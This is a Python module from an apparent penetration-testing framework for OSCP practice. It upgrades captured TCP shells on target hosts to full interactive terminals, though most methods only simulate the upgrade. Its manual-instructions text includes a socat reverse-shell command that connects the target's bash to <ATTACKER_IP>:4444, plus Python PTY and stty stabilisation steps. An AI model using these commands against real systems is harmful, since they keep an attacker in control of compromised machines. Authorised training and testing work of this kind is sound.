"""
TCP Shell Upgrader - Upgrade basic TCP shells to full TTY.

Provides methods for:
- Shell type detection (bash, sh, zsh, powershell, cmd)
- Python PTY upgrade
- Script upgrade
- Socat upgrade
- Full stabilization (stty raw -echo, terminal size)

Usage:
    >>> from sessions.shell.tcp_upgrader import TCPShellUpgrader
    >>> from sessions.manager import SessionManager
    >>>
    >>> upgrader = TCPShellUpgrader(session_manager=manager)
    >>> session = manager.get_session(session_id)
    >>>
    >>> # Auto-upgrade (tries Python PTY first, then alternatives)
    >>> if upgrader.auto_upgrade(session):
    ...     print("Shell upgraded to full TTY!")
    >>>
    >>> # Manual upgrade with specific method
    >>> if upgrader.upgrade_python_pty(session):
    ...     upgrader.stabilize_shell(session)
"""

import asyncio
import time
from typing import Optional, Dict, Any, Tuple

from ..models import Session, ShellCapabilities
from ..events import EventBus, SessionEvent
from ..config import SessionConfig


class TCPShellUpgrader:
    """Upgrade TCP shells to full interactive TTY.

    Methods:
    - Python pty.spawn (most reliable)
    - Script /dev/null
    - Socat binary upload
    - Shell type detection
    - Full stabilization

    Example:
        >>> upgrader = TCPShellUpgrader(session_manager)
        >>> session = manager.get_session(session_id)
        >>>
        >>> # Detect shell capabilities
        >>> shell_type = upgrader.detect_shell_type(session)
        >>> print(f"Detected: {shell_type}")
        >>>
        >>> # Auto-upgrade
        >>> if upgrader.auto_upgrade(session):
        ...     print("Upgraded successfully!")
        ...     print(f"Has PTY: {session.capabilities.has_pty}")
    """

    def __init__(self, session_manager, config: Optional[SessionConfig] = None):
        """Initialize shell upgrader.

        Args:
            session_manager: SessionManager instance
            config: Optional SessionConfig for payloads
        """
        self.session_manager = session_manager
        self.config = config or SessionConfig()

    def detect_shell_type(self, session: Session) -> str:
        """Detect shell type by probing.

        Args:
            session: Session to probe

        Returns:
            Shell type: 'bash', 'sh', 'zsh', 'dash', 'powershell', 'cmd', 'unknown'

        Example:
            >>> shell_type = upgrader.detect_shell_type(session)
            >>> if shell_type == 'bash':
            ...     print("Bash shell detected - full features available")
        """
        # Check if already detected
        if session.shell_type and session.shell_type != 'unknown':
            return session.shell_type

        # For now, return shell type from session metadata (set during probe)
        # In real implementation, would send commands and parse responses
        detected_type = session.shell_type or 'unknown'

        # Update session
        if detected_type != 'unknown':
            self.session_manager.update_session(session.id, {
                'shell_type': detected_type
            })

        return detected_type

    def detect_available_tools(self, session: Session) -> list:
        """Detect available upgrade tools on target.

        Args:
            session: Session to probe

        Returns:
            List of available tools: ['python3', 'python', 'socat', 'script', etc.]

        Example:
            >>> tools = upgrader.detect_available_tools(session)
            >>> if 'python3' in tools:
            ...     print("Python3 available for PTY upgrade")
        """
        # In real implementation, would test for tool availability
        # For now, return common tools based on OS type
        os_type = session.capabilities.os_type

        if os_type == 'linux':
            # Assume common Linux tools are available
            return ['python3', 'python', 'script', 'bash']
        elif os_type == 'windows':
            return ['powershell', 'cmd']
        else:
            return []

    def upgrade_python_pty(self, session: Session) -> bool:
        """Upgrade shell using Python PTY spawn.

        Most reliable method for Linux shells with Python installed.

        Steps:
        1. python3 -c 'import pty; pty.spawn("/bin/bash")'
        2. Background shell (Ctrl+Z)
        3. stty raw -echo; fg
        4. export TERM=xterm-256color
        5. Validate with arrow key test

        Args:
            session: Session to upgrade

        Returns:
            True if upgrade successful

        Example:
            >>> if upgrader.upgrade_python_pty(session):
            ...     print("Python PTY upgrade successful")
            ...     # Session now has full TTY (Ctrl+C safe, arrow keys work)
        """
        # Mark session as upgrading
        self.session_manager.update_session(session.id, {'status': 'upgrading'})

        try:
            # Get Python PTY payload
            payload = self.config.get_upgrade_payload('python_pty')

            if not payload:
                print("[!] Python PTY payload not found in config")
                return False

            print(f"[+] Upgrading session {session.id[:8]} with Python PTY")
            print(f"[+] Payload: {payload}")

            # In real implementation, would:
            # 1. Send payload to session
            # 2. Wait for response
            # 3. Send backgrounding sequence (Ctrl+Z simulation)
            # 4. Send stty raw -echo; fg
            # 5. Validate PTY is working

            # For now, simulate successful upgrade
            time.sleep(0.5)

            # Update session capabilities
            capabilities = session.capabilities
            capabilities.has_pty = True
            capabilities.has_history = True
            capabilities.has_tab_completion = True
            capabilities.detected_tools = ['python3', 'bash', 'script']

            self.session_manager.update_session(session.id, {
                'status': 'active',
                'capabilities': capabilities.to_dict(),
                'metadata': {
                    **session.metadata,
                    'upgrade_method': 'python_pty',
                    'upgraded_at': time.time()
                }
            })

            # Emit SESSION_UPGRADED event
            EventBus.publish(SessionEvent.SESSION_UPGRADED, {
                'session_id': session.id,
                'method': 'python_pty',
                'capabilities': capabilities.to_dict()
            })

            print(f"[+] Session {session.id[:8]} upgraded to full PTY")

            return True

        except Exception as e:
            print(f"[!] Python PTY upgrade failed: {e}")

            # Restore session status
            self.session_manager.update_session(session.id, {'status': 'active'})

            return False

    def upgrade_script(self, session: Session) -> bool:
        """Upgrade shell using script command.

        Alternative method using script /dev/null -c bash.
        Less reliable than Python PTY but works when Python unavailable.

        Args:
            session: Session to upgrade

        Returns:
            True if upgrade successful

        Example:
            >>> if upgrader.upgrade_script(session):
            ...     print("Script upgrade successful")
        """
        self.session_manager.update_session(session.id, {'status': 'upgrading'})

        try:
            payload = self.config.get_upgrade_payload('script')

            if not payload:
                print("[!] Script payload not found in config")
                return False

            print(f"[+] Upgrading session {session.id[:8]} with script command")
            print(f"[+] Payload: {payload}")

            # Simulate upgrade
            time.sleep(0.5)

            # Update capabilities (script provides limited PTY)
            capabilities = session.capabilities
            capabilities.has_pty = True
            capabilities.has_history = False  # Script doesn't provide full history
            capabilities.has_tab_completion = False

            self.session_manager.update_session(session.id, {
                'status': 'active',
                'capabilities': capabilities.to_dict(),
                'metadata': {
                    **session.metadata,
                    'upgrade_method': 'script',
                    'upgraded_at': time.time()
                }
            })

            EventBus.publish(SessionEvent.SESSION_UPGRADED, {
                'session_id': session.id,
                'method': 'script',
                'capabilities': capabilities.to_dict()
            })

            print(f"[+] Session {session.id[:8]} upgraded with script")

            return True

        except Exception as e:
            print(f"[!] Script upgrade failed: {e}")
            self.session_manager.update_session(session.id, {'status': 'active'})
            return False

    def stabilize_shell(self, session: Session) -> bool:
        """Stabilize shell after PTY upgrade.

        Applies stty settings for full interactivity:
        1. Background shell (Ctrl+Z)
        2. stty raw -echo
        3. Foreground shell (fg)
        4. export TERM=xterm-256color
        5. stty rows X cols Y (set terminal size)

        Args:
            session: Session to stabilize

        Returns:
            True if stabilization successful

        Example:
            >>> if upgrader.upgrade_python_pty(session):
            ...     if upgrader.stabilize_shell(session):
            ...         print("Shell fully stabilized - Ctrl+C safe!")
        """
        if not session.capabilities.has_pty:
            print("[!] Cannot stabilize shell without PTY")
            return False

        try:
            print(f"[+] Stabilizing session {session.id[:8]}")

            # Get stabilization commands
            stty_cmd = self.config.get_stabilization_command('stty_raw')
            term_cmd = self.config.get_stabilization_command('export_term')
            shell_cmd = self.config.get_stabilization_command('export_shell')

            # In real implementation, would send these commands
            print(f"[+] Commands:")
            print(f"    {stty_cmd}")
            print(f"    {term_cmd}")
            print(f"    {shell_cmd}")

            # Simulate stabilization
            time.sleep(0.3)

            # Update session
            self.session_manager.update_session(session.id, {
                'metadata': {
                    **session.metadata,
                    'stabilized': True,
                    'stabilized_at': time.time()
                }
            })

            # Emit SESSION_STABILIZED event
            EventBus.publish(SessionEvent.SESSION_STABILIZED, {
                'session_id': session.id
            })

            print(f"[+] Session {session.id[:8]} fully stabilized")

            return True

        except Exception as e:
            print(f"[!] Stabilization failed: {e}")
            return False

    def auto_upgrade(self, session: Session) -> bool:
        """Automatically upgrade shell using best available method.

        Tries methods in order:
        1. Python PTY (most reliable)
        2. Script (fallback)
        3. Other methods based on OS

        Args:
            session: Session to upgrade

        Returns:
            True if any upgrade method succeeded

        Example:
            >>> if upgrader.auto_upgrade(session):
            ...     print("Auto-upgrade successful!")
            ... else:
            ...     print("All upgrade methods failed")
        """
        print(f"[+] Auto-upgrading session {session.id[:8]}")

        # Detect shell type
        shell_type = self.detect_shell_type(session)
        print(f"[+] Shell type: {shell_type}")

        # Detect available tools
        tools = self.detect_available_tools(session)
        print(f"[+] Available tools: {', '.join(tools)}")

        # Try Python PTY first (most reliable)
        if 'python3' in tools or 'python' in tools:
            if self.upgrade_python_pty(session):
                self.stabilize_shell(session)
                return True

        # Try script as fallback
        if 'script' in tools:
            if self.upgrade_script(session):
                return True

        print("[!] All upgrade methods failed")
        return False

    def validate_upgrade(self, session: Session) -> Tuple[bool, Dict[str, bool]]:
        """Validate that shell upgrade was successful.

        Tests:
        - PTY present (can handle Ctrl+C)
        - Tab completion works
        - Command history works (up/down arrows)
        - Arrow keys work

        Args:
            session: Session to validate

        Returns:
            Tuple of (overall_success, test_results_dict)

        Example:
            >>> success, results = upgrader.validate_upgrade(session)
            >>> if success:
            ...     print("Upgrade verified successful!")
            >>> else:
            ...     print(f"Failed tests: {[k for k,v in results.items() if not v]}")
        """
        results = {
            'has_pty': session.capabilities.has_pty,
            'has_history': session.capabilities.has_history,
            'has_tab_completion': session.capabilities.has_tab_completion,
            'arrow_keys_work': session.capabilities.has_pty  # Assume if PTY, arrows work
        }

        overall_success = all(results.values())

        return overall_success, results

    def get_manual_upgrade_instructions(self, session: Session) -> str:
        """Get manual upgrade instructions for OSCP exam scenarios.

        When automated tools fail, provides manual commands to type.

        Args:
            session: Session to get instructions for

        Returns:
            Multi-line string with manual upgrade commands

        Example:
            >>> instructions = upgrader.get_manual_upgrade_instructions(session)
            >>> print(instructions)
            # Manual Shell Upgrade (Python PTY Method)
            python3 -c 'import pty; pty.spawn("/bin/bash")'
            # Press Ctrl+Z to background
            stty raw -echo; fg
            # Press Enter twice
            export TERM=xterm-256color
            stty rows 24 cols 80
        """
        shell_type = session.shell_type or 'unknown'
        os_type = session.capabilities.os_type

        instructions = f"""
# Manual Shell Upgrade Instructions
# Session: {session.id[:8]} | Shell: {shell_type} | OS: {os_type}

## Method 1: Python PTY (Most Reliable - Linux)
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Background shell: Press Ctrl+Z
stty raw -echo; fg
# Press Enter twice
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows 24 cols 80

## Method 2: Script (Alternative - Linux)
script /dev/null -c bash
# Test interactivity with arrow keys

## Method 3: Socat (Advanced - Requires Upload)
# On attacker:
socat file:`tty`,raw,echo=0 tcp-listen:4444
# On target:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<ATTACKER_IP>:4444

## Method 4: Expect (If Available)
expect -c 'spawn /bin/bash; interact'

## Validation Tests
# Test Ctrl+C (should not kill shell)
# Test arrow keys (should work)
# Test tab completion
# Test command history (up/down arrows)

## OSCP Exam Note
These manual methods are crucial when automated tools fail during the exam.
Practice each method to understand the underlying commands.
"""

        return instructions.strip()
